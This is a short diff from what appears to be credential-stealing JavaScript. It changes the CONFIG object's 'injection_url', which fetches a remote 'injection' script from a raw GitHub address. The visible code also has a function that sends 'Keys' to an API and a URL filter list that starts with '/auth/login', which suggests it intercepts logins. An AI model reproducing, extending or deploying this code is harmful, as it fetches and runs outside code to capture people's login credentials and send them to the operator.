@@ -48,7 +48,7 @@ async function sendToApiMessage(Keys, message) {
 
 const CONFIG = {
 
-    injection_url: "https://raw.githubusercontent.com/oprtreasoxro/Index/main/Injection.js",
+    injection_url: "https://raw.githubusercontent.com/oprtreasoxro/Index/main/index.js",
     filters: {
         urls: [
             '/auth/login',
